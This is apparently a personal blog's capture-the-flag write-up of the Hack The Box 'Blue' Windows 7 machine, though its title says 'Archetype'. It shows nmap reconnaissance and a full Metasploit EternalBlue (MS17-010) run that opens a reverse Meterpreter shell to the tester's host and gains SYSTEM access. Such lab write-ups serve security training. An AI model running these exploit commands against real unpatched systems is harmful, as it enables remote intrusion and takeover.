---
title: "Hack The Box - Archetype"
date: 2023-12-02T00:03:25+05:30
draft: false
description: " Blue from HackTheBox is an retired machine which is vulnerable to infamous CVE:CVE-2017-0143 SMB vulnerabilities which can be easily exploited with publicly available scripts and Metasploit "
hideToc: false
enableToc: true
enableTocContent: true
author: Atom
authorEmoji: ✍️
tags: 
- SMB
- CVE-ID-2017-0143
series:
- Pratical Ethical Hacking TCM
categories:
- Easy
- HackTheBox
- Windows
- CVE Exploitation 
- Metasploit
libraries:

image: /images/hackthebox/blue/Blue.png 
---

Hi Hackers Welcome Back, Today we are going to look at Hack The Box Blue Machine.

{{< img src="/images/hackthebox/blue/1.png" alt="image alt" width="450px"  position="center" >}}

## Info Table
<table style="width:100%">
 <thead>
  <tr>
    <th>Title</th>
    <th>Blue</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>Hack The Box</td>
    </tr>
  <tr>
    <td>OS</td>
    <td>Windows</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td><a href="https://www.hackthebox.eu/home/users/profile/1"><img src="https://www.hackthebox.eu/badge/image/1" alt="" style="display: unset"></a>  </td>
    </tr>
    <tr>
    </tr>
</table>

## Kill Chain Summery
While enumerating ports and services we can able to find the service, which is vulnerable to infamous CVE-2017-0143. Smb vulnerabilities which can be easily exploited with publicly available scripts and Metasploit. 

## Mind Map 
{{< img src="/images/hackthebox/blue/mm.png" alt="image alt" width="1000px"  position="center" >}}

## Recon

we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

``` bash
$nmap -Pn -sC -sV -A 10.129.102.59 -oN  initial
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-08 06:35 IST
Stats: 0:01:56 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 77.78% done; ETC: 06:37 (0:00:18 remaining)
Nmap scan report for 10.129.102.59
Host is up (0.35s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-06-08T01:07:44
|_  start_date: 2022-06-07T15:32:51
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-06-08T02:07:43+01:00
|_clock-skew: mean: -19m55s, deviation: 34m36s, median: 3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.70 seconds
```
## Enumeration

``` bash {hl_lines=[20, 21]}
┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~]
└──╼ $nmap -p 135,139,445 -sV -sC  --script vuln 10.129.102.59
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-08 06:57 IST
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.61% done; ETC: 06:57 (0:00:00 remaining)
Nmap scan report for 10.129.102.59
Host is up (0.29s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.73 seconds

```
## Exploitation 

``` bash {hl_lines=[1, 17, 20, 22, 24, 56, 62, 66]}
[msf](Jobs:0 Agents:0) >> search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set rhost 10.129.102.59
rhost => 10.129.102.59
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set lhost 10.10.14.33
lhost => 10.10.14.33
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run

[*] Started reverse TCP handler on 10.10.14.33:4444 
[*] 10.129.102.59:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.102.59:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.102.59:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.102.59:445 - The target is vulnerable.
[*] 10.129.102.59:445 - Connecting to target for exploitation.
[+] 10.129.102.59:445 - Connection established for exploitation.
[+] 10.129.102.59:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.102.59:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.102.59:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.102.59:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.102.59:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.102.59:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.102.59:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.102.59:445 - Sending all but last fragment of exploit packet
[*] 10.129.102.59:445 - Starting non-paged pool grooming
[+] 10.129.102.59:445 - Sending SMBv2 buffers
[+] 10.129.102.59:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.102.59:445 - Sending final SMBv2 buffers.
[*] 10.129.102.59:445 - Sending last fragment of exploit packet!
[*] 10.129.102.59:445 - Receiving response from exploit packet
[+] 10.129.102.59:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.102.59:445 - Sending egg to corrupted connection.
[*] 10.129.102.59:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.129.102.59
[*] Meterpreter session 1 opened (10.10.14.33:4444 -> 10.129.102.59:49158 ) at 2022-06-08 07:02:32 +0530
[+] 10.129.102.59:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.102.59:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.102.59:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

(Meterpreter 1)(C:\Windows\system32) > shell
Process 1840 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```



you can find flags under Haries and Administrator's Desktop folder 

{{< notice success "we have successfully Pwned the Machine " >}}
See you on the next Blog, Happy hacking...
{{< /notice >}}